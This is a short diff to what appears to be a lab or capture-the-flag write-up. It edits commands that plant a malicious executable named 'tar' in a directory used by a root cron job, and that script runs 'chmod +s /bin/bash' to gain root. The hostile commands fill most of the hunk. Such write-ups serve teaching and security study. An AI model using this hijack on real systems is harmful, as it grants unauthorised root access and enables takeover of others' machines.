@@ -105,7 +105,8 @@ Because the cron job runs inside a directory owned/writable by alfredo and invok
 A malicious executable script named tar was injected into the directory to assign the SUID bit to /bin/bash when executed by root:
 
 # Create the script to modify bash permissions
-echo "chmod +s /bin/bash" > tar
+echo '#!/bin/bash' > tar
+echo "chmod +s /bin/bash" >> tar
 chmod +x tar
 
 # Wait for the cronjob cycle to run as root...
